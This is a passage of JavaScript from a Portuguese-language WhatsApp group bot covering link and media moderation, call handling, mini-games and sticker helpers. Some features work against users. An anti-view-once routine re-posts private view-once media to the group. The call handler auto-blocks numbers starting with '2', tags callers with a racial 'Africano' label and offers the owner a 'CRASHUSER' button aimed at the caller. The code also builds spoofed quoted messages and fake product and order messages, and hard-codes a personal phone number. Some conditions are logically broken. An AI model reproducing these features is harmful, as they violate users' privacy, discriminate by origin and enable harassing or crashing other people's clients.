}
}


//=======================================\\

//===============(simih)=============\\
const simih = async (text) => {
	try {
data = await fetchJson(`https://simsimi.info/api/?text=${text}&lc=pt`, {method: 'get'})
simi = `${data.message}`
return simi
} catch {
return 
}
}

async function AntilinkHardF() {
if(isUrl(budy2) && isAntiLinkHard && isGroupAdmins && isBotGroupAdmins && !info.key.fromMe) {
if(command == "tiktok" && command == "facebook" && command == "instagram" && command == "tiktok" && command == "twitter" && command == "ytmp3" && command == "ytmp4" && command == "play") return
linkgpp = await nezuko.groupInviteCode(from)
if(budy2.match(`${linkgpp}`)) return
if(!isUrl(budy2)) return 
if(type === "buttonsResponseMessage") return
if(type === "listResponseMessage") return
if(budy2.includes(`${linkgpp}`)) return 
reply('*Link detectado, porém usuário é admin*')
}

if(isUrl(budy2) && isAntiLinkHard && !isGroupAdmins && isBotGroupAdmins && !info.key.fromMe) {
if(command == "tiktok" && command == "facebook" && command == "instagram" && command == "tiktok" && command == "twitter" && command == "ytmp3" && command == "ytmp4" && command == "play") return  
linkgpp = await nezuko.groupInviteCode(from)
if(budy2.match(`${linkgpp}`)) return reply('Link do nosso grupo, não irei remover.. ')  
if(!isUrl(budy2)) return 
if(type === "buttonsResponseMessage") return
if(type === "listResponseMessage") return
reply('*Link detectado, punindo usuário...*')
if(!JSON.stringify(groupMembers).includes(sender)) return
nezuko.groupParticipantsUpdate(from, [sender], 'remove')
}
} 
AntilinkHardF()
joguinhodavelha()

if(isUrl(body) && isAntilinkgp && isGroup && isBotGroupAdmins) {
if(!isAntilinkgp) return
if(!isUrl(body)) return 
if(isGroupAdmins) return reply("Você é adm, não removerei você..") 
if(budy2.includes("chat.whatsapp.com/")){
if(!budy2.includes("chat.whatsapp.com/")) return
if(isBot) return 
linkgpp = await nezuko.groupInviteCode(from)
if(budy.match(`${linkgpp}`)) return reply('Link do nosso grupo, não irei remover.. ')  
reply('*Link de grupo detectado, punindo usuário...*')
if(!JSON.stringify(groupMembers).includes(sender)) return
nezuko.groupParticipantsUpdate(from, [sender], 'remove')
}
}


//======(ANTI-IMAGEM)========\\
if(isAntiImg && isBotGroupAdmins && type == 'imageMessage') {
if (m.key.fromMe) return
if(isGroupAdmins) return nezuko.sendMessage(from, {text:'*mensagem proibida detectada, porém é admin logo a punição será anulada*'}, {quoted: dnselo})
await nezuko.sendMessage(from, {text: '*mensagem proibida detectada, banindo...*'}, {quoted: dnselo})
setTimeout(async function () {
nezuko.groupParticipantsUpdate(from, [sender], 'remove')
}, 1000)
}

//======(ANTI-STICKER)========\\
if(isAntiSticker && isBotGroupAdmins && type == 'stickerMessage') {
if (m.key.fromMe) return
if(isGroupAdmins) return nezuko.sendMessage(from, {text:'*mensagem proibida detectada, porém é admin logo a punição será anulada*'}, {quoted: dnselo})
await nezuko.sendMessage(from, {text: '*mensagem proibida detectada, banindo...*'}, {quoted: dnselo})
setTimeout(async function () {
nezuko.groupParticipantsUpdate(from, [sender], 'remove')
}, 1000)
}

if(Antidoc && isBotGroupAdmins && type == 'documentMessage') {
if (m.key.fromMe) return
if(isGroupAdmins) return nezuko.sendMessage(from, {text:'*mensagem proibida detectada, porém é admin logo a punição será anulada*'}, {quoted: dnselo})
await nezuko.sendMessage(from, {text: '*mensagem proibida detectada, banindo...*'}, {quoted: dnselo})
setTimeout(async function () {
nezuko.groupParticipantsUpdate(from, [sender], 'remove')
}, 1000)
}

//=============BLOCKCMD===============\\
if(isGroup){
const checar = getComandos(from)
if(checar === undefined) addComandosId(from)
}
if(isGroup && isCmd && !SoDono && !isnit && getComandoBlock(from).includes(command))return reply('comando blockeado')
	
//===============FIM====================\\

// ANTI NOTAS FAKES ======================>

if(isAntiNotas && body.toString().match(/(💳|💎|💸|💵|💷|💶|🪙|💰|🤑|⚖️)/gi) && isBotGroupAdmins) {
if(type == 'stickerMessage') return
let verificar = body.toString().match(/(💳|💎|💸|💵|💷|💶|🪙|💰|🤑|⚖️)/gi)
if (verificar && body.length < 100) return  
await nezuko.sendMessage(from, {text: '*mensagem proibida detectada, banindo...*'}, {quoted: dnselo})
setTimeout(async function () {
nezuko.groupParticipantsUpdate(from, [sender], 'remove')
}, 1000)
}

//FINALZIN ==============================>


//======(ANTI-VIDEO)========\\
if(isAntiVid && isBotGroupAdmins && type == 'videoMessage') {
if(isGroupAdmins) return nezuko.sendMessage(from,{text:'*mensagem proibida detectada, porém é admin logo a punição será anulada*'}, {quoted: dnselo})
await nezuko.sendMessage(from, {text: '*mensagem proibida detectada, banindo...*'}, {quoted: dnselo})
setTimeout(async function () {
nezuko.groupParticipantsUpdate(from, [sender], 'remove')
}, 1000)
}

//=============(antiviewone)============\\
if(antiview.includes(from)) {
if(isViewOnce){
if (Object.keys(info.message.viewOnceMessage.message)[0] == 'imageMessage'){
bhj = info.message.viewOnceMessage.message[Object.keys(info.message.viewOnceMessage.message)[0] ]
buff = await getFileBuffer(bhj, 'image')
nezuko.sendMessage(from, {image: buff, caption:'O Antiviewone Ativo Neste Grupo' + (`caption` in bhj ? `\n\nlegenda: ${bhj?.caption}` :'')}, {quoted: info}).catch(e => {
console.log(e);
})
}else if (Object.keys(info.message.viewOnceMessage.message)[0] == 'videoMessage'){
bhj = info.message.viewOnceMessage.message[Object.keys(info.message.viewOnceMessage.message)[0] ]
buff = await getFileBuffer(bhj, 'video')
nezuko.sendMessage(from, {video: buff,caption:'O Antiviewone Ativo Neste Grupo' + (`caption` in bhj ? `\n\nLegenda: ${bhj?.caption}` :'') }, {quoted: info}).catch(e => {
console.log(e);
})
}}
}

//======(ANTI-AUDIO)=======\\
if(isAntiAudio && isBotGroupAdmins && type == 'audioMessage') {
if(isGroupAdmins) return nezuko.sendMessage(from, {text:'*mensagem proibida detectada, porém é admin logo a punição será anulada*'}, {quoted: dnselo})
await nezuko.sendMessage(from, {text: '*mensagem proibida detectada, banindo...*'}, {quoted: dnselo})
setTimeout(async function () {
nezuko.groupParticipantsUpdate(from, [sender], 'remove')
}, 1000)
}
//=======================================\\

if(isGroup && isBotGroupAdmins && !isGroupAdmins && !SoDono && !info.key.fromMe) {
if(info.message?.extendedTextMessage?.contextInfo?.mentionedJid?.length == groupMembers.length || info.message?.extendedTextMessage?.contextInfo?.mentionedJid?.length == groupMembers.length - 1) { 
reply("MEMBRO COM MENSAGEM DE MARCAÇÃO DE TODOS DO GRUPO, POR CONTA DISSO VOU REMOVER DO GRUPO, QUALQUER COISA VÁ NO PV DO ADMINISTRADOR...")
nezuko.groupParticipantsUpdate(from, [sender], "remove")
}
}
//========(ANTI-PV-QUE-BLOQUEIA)======\\
if(isAntiPv && !isGroup && !SoDono && !m.key.fromMe && !isPremium){ 
reply(`[🚫] 𝗔𝗡𝗧𝗜𝗣𝗩 𝗤𝗨𝗘 𝗕𝗟𝗢𝗤𝗨𝗘𝗜𝗔! [🚫]\nUsuários que enviarem mensagem no privado, será bloqueado pois antipv está ativo, fale com meu dono para solicitar o desbloqueio: wa.me/${numerodn}`)
setTimeout(async () => {
nezuko.updateBlockStatus(sender, 'block')
}, 1000)
return
}
//======================================\\

const bemvindopv = JSON.parse(fs.readFileSync('./funções de cmd/funções/welcomepv.json'))
if (!isCmd && !isGroup && !info.key.fromMe && !bemvindopv.includes(sender)) {    
        var menuzin = `𝐌𝐄𝐍𝐒𝐀𝐆𝐄𝐌 𝐃𝐄 𝐁𝐎𝐀𝐒 𝐕𝐈𝐍𝐃𝐀𝐒!\n*Olá*, prazer em conhecê-lo(a), me chamo *${NomeDoBot}*. _Sou uma inteligência artificial 100% automatizado para ajudar em todo que for possível nessa plataforma!_\n*Estou a sua disposição o dia todo, 24h horas por dia para te ajudar!* _Tenho +1mil comandos, entre eles de fazer figurinhas, pesquisa, download de músicas..._` 
        nezuko.sendMessage(from, {text: menuzin, footer: `Espero que goste e aproveite bastante!`, buttons: [{buttonId: `${prefix}criador`, buttonText: {displayText: '𝗦𝘂𝗽𝗼𝗿𝘁𝗲'}, type: 1}, {buttonId: `${prefix}avaliar`, buttonText: {displayText: '𝗔𝘃𝗮𝗹𝗶𝗮𝗿'}, type: 1},  {buttonId: `${prefix}menu`, buttonText: {displayText: '𝗠𝗲𝗻𝘂 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗼'}, type: 1}]}, {quoted: dnselo})
bemvindopv.push(sender)
fs.writeFileSync('./funções de cmd/funções/welcomepv.json', JSON.stringify(bemvindopv))
}

//===(ANTI-CALL)===\\
nezuko.ws.on('CB:call', async (json) => {
console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m LIGAÇÃO DETECTADA \x1b[1;37m]')
const callerId = json.content[0].attrs['call-creator']
   if (json.content[0].tag == 'offer') {
   function sendButtonBlock(id, contentText, footerText, options = {}) {
  const content = {
    buttonsMessage: {
      contentText: contentText,
      footerText: footerText,
      buttons: [],
      contextInfo: {
        isForwarded: true,
        forwardingScore: 0
      },
      headerType: 1
    }
  };
  const key = Object.keys(content)[0];
  content[key].contextInfo.mentionedJid = ('contextInfo' in options) ? options.contextInfo.mentionedJid : [];
  if ('quoted' in options) {
    const { quoted } = options;
    content[key].contextInfo.participant = quoted.key.participant;
    content[key].contextInfo.quotedMessage = quoted.message;
  } else if ('contextInfo' in options) {
    
  }
  nezuko.relayMessage(id, content, {
    messageId: require('@adiwajshing/baileys').generateMessageID(), additionalAttributes: {}});
}

    if(callerId.startsWith(`2`)) return sendButtonBlock(callerId, `_*Anticall 📞*_`,`*Você será bloqueado, evite ligações na próxima vez*`).then(() => nezuko.updateBlockStatus(callerId, "block"))
    
    sendButtonBlock(callerId, `\t\t⚠️ Aviso sobre a ligação ⚠️\n`,`Devido as minhas configurações atuais, as ligações para mim são proibidas e, por isso, sua ligação foi reportada à administração 𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿`)
    const buttons = [
  {buttonId: `${prefix}anticallaviso ${callerId}`, buttonText: {displayText: '「🔔」AVISO「🔔」'}, type: 1},
  {buttonId: `${prefix}anticallblock ${callerId}`, buttonText: {displayText: '「🚫」BLOQUEAR「🚫」'}, type: 1},
  {buttonId: `${prefix}crash2 ${callerId}`, buttonText: {displayText: '「🛑」CRASHUSER「🛑」'}, type: 1}
]

const buttonMessage = {
    text: "\t\t𝖫𝗂𝗀𝖺çã𝗈 𝖣𝖾𝗍𝖾𝖼𝗍𝖺𝖽𝖺\n",
    footer: `👤 Usuário: ${pushname}\n☎ ️Número: ${callerId.split("@")[0]}\n🔗 Wame: wa.me/${sender.split('@')[0]}\n🌐 Nacionalidade: ${callerId.startsWith(`2`) ? `Africano 👨🏿` : !callerId.startsWith(`55`) && ! callerId.startsWith(`2`) ? `Estrangeiro 🗿` : `BR 🇧🇷`}`,
    buttons: buttons,
    headerType: 1
}
const sendMsg = await nezuko.sendMessage("5521964523665@s.whatsapp.net", buttonMessage)         
    }
    })
///////////////////////


//=========(ANTIPV-QUE-SÓ-FALA)==========\\

if(!isGroup && !isPremium && !SoDono && !m.key.fromMe && banChats === true) return 
const atibot = m.isBaileys
if (atibot === true) return 


//======================================\\
 
if(fs.existsSync(`./func/limitecaracteres/limite-c_${from}.json`)) {
var limitecaracteres_on = JSON.parse(fs.readFileSync(`./func/limitecaracteres/limite-c_${from}.json`))
var limitefl = limitecaracteres_on.limite
} else {
var limitefl = limitefll.limitefl
}



      const allForcaId = []
for(let obj of forca) allForcaId.push(obj.id)
const isPlayForca = allForcaId.indexOf(sender) >= 0 ? true : false

async function randompalavra() {
    return new Promise(async (resolve, reject) => {
fetch('https://www.palabrasaleatorias.com/palavras-aleatorias.php?fs=1&fs2=0&Submit=Nova+palavra',).then(async function (res, err) {
if(err) reject(err)    
var $ = cheerio.load(await res.text())
resolve($('body > center > center > table:nth-child(4) > tbody > tr > td > div')[0].children[0].data)
})
    }) 
}


//===================================== 

const enviarfiguimg = async (jid, path, quoted, options = {}) => {
let buff = Buffer.isBuffer(path) ? path: /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64'): /^https?:\/\//.test(path) ? await (await getBuffer(path)): fs.existsSync(path) ? fs.readFileSync(path): Buffer.alloc(0)
let buffer
if (options && (options.packname || options.author)) {
 buffer = await writeExifImg(buff, options)
} else {
 buffer = await imageToWebp(buff)
}
await nezuko.sendMessage(jid, {
 sticker: {
url: buffer
 }, ...options
}, {
 quoted
})
return buffer
 }

//===================================== 

 const enviarfiguvid = async (jid, path, quoted, options = {}) => {
let buff = Buffer.isBuffer(path) ? path: /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64'): /^https?:\/\//.test(path) ? await (await getBuffer(path)): fs.existsSync(path) ? fs.readFileSync(path): Buffer.alloc(0)
let buffer
if (options && (options.packname || options.author)) {
 buffer = await writeExifVid(buff, options)
} else {
 buffer = await videoToWebp(buff)
}

await nezuko.sendMessage(jid, {
 sticker: {
url: buffer
 }, ...options
}, {
 quoted
})
return buffer
 }    
 

//=======================\\

const mencionar = ( foto, texto, membro, ids ) => {
( ids == null || ids == undefined || ids == false ) ? nezuko.sendMessage(from, { image: foto, caption: texto.trim(), contextInfo: { "mentionedJid": membro } }) : nezuko.sendMessage(from, { image: foto, caption: texto.trim(), contextInfo: { "mentionedJid": membro } })
}

//========================\\

//-_-_-_-_--_-_-_-_-_--_-JSON-FUNÇÕES-_-_-_-_-_-_-_-_-_-_-_-_\\
const { addVotoDuelo, delVotoDuelo } = require('./funcoes/votoduelo.js')

//-_-_-_-_--_-_-_-_-_--_--_-_-_-_-_-_-_-_-_-_-_-_\\

const votacao = JSON.parse(fs.readFileSync('./dados/votacao/votacao.json'))

const votacaoduelo = JSON.parse(fs.readFileSync('./dados/duelo/votacaoduelo.json'))
//-_-_-_-_--_-_-_-_-_--_--_-_-_-_-_-_-_-_-_-_-_-_\\

//============(FUNÇÕES)============\\

const isVoto = isGroup ? votacao.includes(from) : false

const isVotoDuelo = isGroup ? votacaoduelo.includes(from) : false

//-_-_-_-_--_-_-_-_-_--_--_-_-_-_-_-_-_-_-_-_-_-_\\

/** VOTAÇÃO ESTILO DUELO : VS **/

if( isGroup ) {

if (budy.toLowerCase() === 'um'){

let voto = JSON.parse(fs.readFileSync(`./dados/duelo/P_votos/${from}.json`))
let _votos = JSON.parse(fs.readFileSync(`./dados/duelo/votos/${from}.json`))
let filtro = voto.map(v => v.participante)
let id_voto = sender ? sender : '0@s.whatsapp.net'
if(filtro.includes(id_voto)) {
return mentions('Olá '+'@' + sender.split('@')[0] + '\n~ Não é possível votar duas vezes.', filtro, true)
} else {
voto.push({
participante: id_voto,
votacao: '1'
})
fs.writeFileSync(`./dados/duelo/P_votos/${from}.json`,JSON.stringify(voto))
let _p = []
let _voto = `VOTAÇÃO...\n\nParticipante 1: @${_votos[0].votos.split('@')[0]}\nParticipante 2: @${_votos[0].votos2.split('@')[0]}\nMotivo da votação: ${_votos[0].razao}\nTotal de votos: ${voto.length}.\nDuração: ${_votos[0].duracao} minuto.`
for(let i = 0; i < voto.length; i++) {
_voto +=  `\n\n========\nMembro: @${voto[i].participante.split('@')[0]}\nVotou em: ${voto[i].votacao}\n========`
_p.push(voto[i].participante)
}
_p.push(_votos[0].votos, _votos[0].votos2)
mentions(_voto,_p,true)
}
} else if (budy.toLowerCase() === 'dois'){
const voto = JSON.parse(fs.readFileSync(`./dados/duelo/P_votos/${from}.json`))
let _votos = JSON.parse(fs.readFileSync(`./dados/duelo/votos/${from}.json`))
let filtro = voto.map(v => v.participante)
let id_voto = sender ? sender : '0@s.whatsapp.net'
if(filtro.includes(id_voto)) {
return mentions('Olá '+'@' + sender.split('@')[0] + '\n~ Não é possivel votar duas vezes.', filtro, true)
} else {
voto.push({
participante: id_voto,
votacao: '2'
})
fs.writeFileSync(`./dados/duelo/P_votos/${from}.json`,JSON.stringify(voto))
let _p = []
let _voto = `VOTAÇÃO...\n\nParticipante 1: @${_votos[0].votos.split('@')[0]}\nParticipante 2: @${_votos[0].votos2.split('@')[0]}\nMotivo da votação: ${_votos[0].razao}\nTotal de votos: ${voto.length}.\nDuração: ${_votos[0].duracao} minuto.`
for(let i = 0; i < voto.length; i++) {
_voto +=  `\n\n========\nMembro: @${voto[i].participante.split('@')[0]}\nVotou em: ${voto[i].votacao}\n========\n`
_p.push(voto[i].participante)
}
_p.push(_votos[0].votos, _votos[0].votos2)
mentions(_voto,_p,true)
}
}
}	


//======================================\\

//========(CONTADOR-DE-MENSAGENS)========\\

const groupIdscount = []
const numbersIds = []
for(let obj of countMessage) {
groupIdscount.push(obj.groupId)
}
if(isGroup && groupIdscount.indexOf(from) >= 0) {
var ind = groupIdscount.indexOf(from)
for(let obj of countMessage[ind].numbers) {numbersIds.push(obj.id)}
if(numbersIds.indexOf(sender) >=0) {
var indnum = numbersIds.indexOf(sender)
countMessage[ind].numbers[indnum].messages += 1
countMessage[ind].numbers[indnum].cmd_messages += isCmd ? 1 : 0
fs.writeFileSync('./funções de cmd/grupos/countmsg.json', JSON.stringify(countMessage, null, 2)+ '\n')
} else {
const messages = 1
const cmd_messages = isCmd ? 1 : 0
countMessage[ind].numbers.push({
id: sender,
messages: messages,
cmd_messages: cmd_messages
})
fs.writeFileSync('./funções de cmd/grupos/countmsg.json', JSON.stringify(countMessage, null, 2) + '\n')
}
} else if(isGroup) {
countMessage.push({
groupId: from,
numbers: [{
id: sender,
messages: 2,
cmd_messages: isCmd ? 1 : 0
}]
})
fs.writeFileSync('./funções de cmd/grupos/countmsg.json', JSON.stringify(countMessage, null, 2) + '\n')
}


//======================================\\

//===============(AUTO-BAN)=============\\
const dbids = []
for(i=0;i<adeuscara.length;++i) {
dbids.push(adeuscara[i].groupId)
}

//======================================\\


//=====================================   

this.suit = this.suit ? this.suit : {}
let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
let win = ''
let tie = false
if (sender == roof.p2 && /^(acc(ept)?|aceitar|Aceitar|Ok?|aceita|Ação|Posterior|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
if (/^(Menos|Ação|rejeitar|n|ga(k.)?bisa)/i.test(m.text)) {
nezuko.sendTextWithMentions(from, `@${roof.p2.split`@`[0]} terno de lixo, terno cancelado`, m)
delete this.suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = from
clearTimeout(roof.waktu)
//delete roof[roof.id].waktu
nezuko.sendText(from, `O jogo foi enviado para conversar.

@${roof.p.split`@`[0]} e 
@${roof.p2.split`@`[0]}

Selecione o jogo em cada bate-papo"
clique https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
if (!roof.pilih) nezuko.sendText(roof.p, `Por favor, selecione \n\nPedra🗿\nPapel📄\nTesoura✂️`, m)
if (!roof.pilih2) nezuko.sendText(roof.p2, `Por favor, selecione \n\nPedra🗿\nPapel📄\Tesoura✂️`, m)
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) nezuko.sendText(from, `Ambos os jogadores não têm intenção de jogar,\njogo cancelado`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
nezuko.sendTextWithMentions(from, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} não escolher um jogo, o jogo terminou`, m)
}
delete this.suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = m.sender == roof.p
let jwb2 = m.sender == roof.p2
let g = /tesoura/i
let b = /pedra/i
let k = /papel/i
let reg = /^(tesoura|pedra|papel)/i
if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(m.text.toLowerCase())[0]
roof.text = m.text
reply(`Você escolheu ${m.text} ${!roof.pilih2 ? `\n\nEsperando que o oponente escolha` : ''}`)
if (!roof.pilih2) nezuko.sendText(roof.p2, '_O oponente já escolheu_\nAgora é sua vez.', 0)
}
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
reply(`Você escolheu ${m.text} ${!roof.pilih ? `\n\nEsperando que o oponente escolha` : ''}`)
if (!roof.pilih) nezuko.sendText(roof.p, '_O oponente já escolheu_\nAgora é sua vez.', 0)
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
nezuko.sendText(roof.asal, `_*Resultados do jogo*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Ganhou \n` : ` Perdido \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Ganhou \n` : ` Perdido \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
delete this.suit[roof.id]
}
}

//=====================================
const isFiltered = (sender) => !!usedCommandRecently.has(sender)


const addFilter = (sender) => {
    usedCommandRecently.add(sender)
    setTimeout(() => usedCommandRecently.delete(sender), 4000) 
}
//=====================================
		

//=====================================
	
	



if (isAntiLinkHard && isUrl(budy) && isFiltered(sender) && isGroup) {
console.log(color('~> [SPAM] - LINK', 'red'), color(moment.tz('America/Sao_Paulo').format('HH:mm:ss'), 'yellow'), color(`${budy}`), 'DE:', color(pushname))
if(info.key.fromMe) return 
return 
}


//=====================================


//========MIDIA=============\\


//=============SELOS=============

//FAKEREPLY PRODUCT
const ftoko = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "120363042083601149@g.us" } : {})
},
message: {
"productMessage": {
"product": {
"productImage":{
"mimetype": "image/jpeg",
"jpegThumbnail": log0},
"title": "Daniel", 
"description": "ж☬ˢLᎾᏒᎠᎬ༻꧂ BOT", 
"currencyCode": "USD",
"priceAmount1000": "2000",
"retailerId": "My[P.L]",
"productImageCount": 1
},
"businessOwnerJid": `0@s.whatsapp.net`
}
}
}

//=====================================

//FAKEREPLY TROLI
const ftroli = {
key : {
participant : '5521964523665@s.whatsapp.net'
},
message: {
orderMessage: {
itemCount : 1,
status: 1,
surface : 1,
message: 'My[DN]',
orderTitle: 'Bang',
thumbnail: log0,
sellerJid: '0@s.whatsapp.net'

}
}
}

//=====================================

//FAKEREPLY LOCATION
const flokasi = {
key : {
 participant : '5521964523665@s.whatsapp.net'
},
message: {
locationMessage: {
name: 'BRASIL',
jpegThumbnail: log0
}
}
}

//=====================================

//FAKEREPLY DOCUMENT
const fdocs = {
key : {
 participant : '5521964523665@s.whatsapp.net'
},
message: {
documentMessage: {
title: 'OLÁ BEM?', 
jpegThumbnail: log0
}
}
}

//=====================================

//FAKEREPLY GROUPINVITE
const fgclink = {
"key": {
"fromMe": false,
"participant": "0@s.whatsapp.net",
"remoteJid": "0@s.whatsapp.net"
},
"message": {
"groupInviteMessage": {
"groupJid": "120363042083601149@g.us",
"inviteCode": "mememteeeekkeke",
"groupName": "P", 
"caption": "OLÁ BOM JOGO", 
'jpegThumbnail': log0
}
}
}

//=====================================

//FAKEREPLY GIF
const fgif = {
key: { 
fromMe: false,
participant: `5521964523665@s.whatsapp.net`, ...(from ? 
{ remoteJid: "120363042083601149@g.us" } : {}) 
},
message: { 
 "videoMessage": { 
 "title":"Daniel",
 "h": `Hmm`,
 'seconds': "30", 
 'gifPlayback': 'true', 
 'caption': ' ɴᴇᴢᴜᴋᴏ ʙᴏᴛ ',
 'jpegThumbnail': log0
}
}
} 

//=====================================

//FAKEREPLY TEXT WITH THUMBNAIL
const fakey = (teks) => {
nezuko.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `SÓ FÉ 😎`,"body": `ʟɪɴᴋ ɢʀᴜᴘᴏ ж☬ˢLᎾᏒᎠᎬ༻꧂ ʙᴏᴛ ᴏғᴄ`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./funções de cmd/mídia-ft-vd/fotos/nezuko.jpg`),"sourceUrl": "https://chat.whatsapp.com/HuzS4bvjpQ6978JZ5PJ2xh"}}}, { quoted: dnselo})
}
const ftextt = {
key: { 
fromMe: false,
participant: `5521964523665@s.whatsapp.net`, ...(from ? 
{ remoteJid: "6289643739077-1613049930@g.us" } : {}) 
},
message: { 
"extendedTextMessage": {
 "text":"OLÁ BEM? ",
"title": `Hmm`,
 'jpegThumbnail': log0
}
} 
}

//=====================================

//FAKEREPLY VN
const fvn = {
key: { 
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? 
{ remoteJid: "120363042083601149@g.us" } : {}) 
},
message: { 
"audioMessage": {
"mimetype":"audio/ogg; codecs=opus",
"seconds": "22:33",
"ptt": "true"
}
} 
}
l = 1
monospace = '```'


 
const enviarOrda = async(jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
"orderMessage": {
"orderId": orid, // Change ID
"thumbnail": img, // Change the Image
"itemCount": itcount, // Change the Item Count
"status": "INQUIRY", // Don't Replace
"surface": "CATALOG", // Don't Replace
"orderTitle": title, // Change the title
"message": text, // Change Message
"sellerJid": sellers, // Change the seller
"token": tokens, // Change the token
"totalAmount1000": ammount, // Change the Total Amount
"totalCurrencyCode": "BRL", // Up to you
}
}), { userJid: jid })
nezuko.relayMessage(jid, order.message, { messageId: order.key.id})
}

const enviarCatalog = async(jid, titulo, texto, valor) => {
const catalog = generateWAMessageFromContent(jid, proto.Message.fromObject({
"productMessage": {
"product": {
	"productImage": {
			"url": "https://mmg.whatsapp.net/d/f/An6ssWQrEx3DYOvrXx5Ld5-1zzyW8DpRhZvr2ZCKrIu-.enc",
			"mimetype": "image/jpeg",
			"fileSha256": "fR9ZYUp6oPISWJNO6ywrBBNck0OpSw7FYL6XPXjKS6M=",
			"fileLength": "99999999999",
			"height": 50,
			"width": 50,
			"mediaKey": "/BQzqmWzeGOB1X7aPOCAxbVUeZL18bw3v9J7yA0Vn2Y=",
			"fileEncSha256": "C7LQFJx65AAS6sdALkCGNmDC+0NWilRBH8zHa+Lt4x4=",
			"directPath": "/v/t62.7118-24/35880876_730612661375500_4224816547459430339_n.enc?ccb=11-4&oh=01_AVxtkNgm-pIDHhEhvkfWXRnfU9WbYIckQFKZrtbZuAzGmw&oe=631A1B4E&_nc_hot=1660217709",
			"mediaKeyTimestamp": "1660217472",
			"jpegThumbnail": userppbuff
		},
		"productId": "7912700932134833",
		"title": titulo,
		"description": texto,
		"currencyCode": "BRL",
		"priceAmount1000": valor,
		"productImageCount": 2
		},
	"businessOwnerJid": "5521964523665@s.whatsapp.net"
	}
}), { userJid: jid })
nezuko.relayMessage(jid, catalog.message, { messageId: catalog.key.id})
}
//========BOTÃO MENU=============


const sendButton5 = async (id, text1, desc1, yo) => {
var buatpesan = await generateWAMessageFromContent(from, {
    "templateMessage": {
      "hydratedTemplate": {
...yo.message,
"hydratedContentText": text1,
"hydratedFooterText": desc1,
"hydratedButtons": [
{
"urlButton": {
"displayText": "[👥] ɴᴀ̃ᴏ ᴀᴘᴇʀᴛᴇ [👥] ",
"url": "https://wa.me/5521964523665?text=Desculpa%20,Daniel%2C%20eu%20n%C3%A3o%20resisti%F0%9F%98%94%E2%9C%8C"
}
},
{
"urlButton": {
"displayText": "[🎴] ᴄᴀɴᴀʟ ᴅᴏ ʏᴏᴜᴛᴜʙᴇ [🎴]",
"url": "https://youtube.com/c/PLMODS"
}
},
{
"quickReplyButton": {
"displayText": "[🎨] ᴍᴇɴᴜ ʟᴏɢᴏs [🎨️] ",
"id": `${prefix}menulogos`
}
},
{
"quickReplyButton": {
"displayText": "[🗣️] ᴀᴋɪɴᴀᴛᴏʀ [🗣️]",
"id": `${prefix}akinator`,
}
},
{
"quickReplyButton": {
"displayText": "[⚡️] ᴘɪɴɢ [⚡️]",
"id": `${prefix}ping2`
}
}
]
      }
    }
  }, {})
nezuko.relayMessage(id, buatpesan.message, { messageId: buatpesan.key.id })
}

//========BOTÃO DO AKINATOR)=============

switch(argsButton[0]) {
case 'finaki':
if(argsButton[1] == 'nao') {
reply('*Puxa não foi desta vez 😔*')
akinator[0][from] = undefined
fs.writeFileSync('./funções de cmd/funções/akinator.json', JSON.stringify(akinator, null, 2))
} else {
reply('*SABIA! EU VENCI OTÁRIO 🥳*')
akinator[0][from] = undefined
fs.writeFileSync('./funções de cmd/funções/akinator.json', JSON.stringify(akinator, null, 2))
}
break
case 'akinator':
if (!isGame) return reply(mensagem[0].game);
if(argsButton[1] == 'nao') return reply('*Até a próxima amigo*') 
if(akinator[0][from]) return reply('*Desculpe-me amigo alguem ja está jogando, aguarde pra chegar sua vez*')
akinator[0][from] = {
    id: from,
    player: sender,
    game: new Aki({region: 'pt'})
}
await akinator[0][from].game.start()
listMessage = {
    text: akinator[0][from].game.question,
    footer: 'Mostrar opções',
    buttonText: 'Opções',
    title: "Pergunta",
    sections: [{
title: 'Opções',
rows: [{
rowId: `${prefix}respaki 0`,
title: 'Sim',
description: ''
},
{
rowId: `${prefix}respaki 1`,
title: 'Não',
description: ''
},{
rowId: `${prefix}respaki 2`,
title: 'Não sei',
description: ''
},{
rowId: `${prefix}respaki 3`,
title: 'Provavelmente sim',
description: ''
},
{
rowId: `${prefix}respaki 4`,
title: 'Provavelmente não',
description: ''
}]
    }]
}
nezuko.sendMessage(from, listMessage)
fs.writeFileSync('./funções de cmd/funções/akinator.json', JSON.stringify(akinator, null, 2))
break
}

